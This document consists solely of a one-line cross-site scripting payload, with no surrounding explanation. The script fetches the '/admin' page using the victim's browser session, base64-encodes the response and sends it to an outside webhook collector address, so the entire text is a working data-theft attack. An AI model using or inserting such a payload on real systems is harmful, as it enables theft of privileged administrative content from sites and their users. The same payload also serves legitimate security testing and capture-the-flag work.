<script>fetch('/admin').then(r=>r.text()).then(f=>fetch('https://your.webhook.site/?f='+btoa(f)))</script>
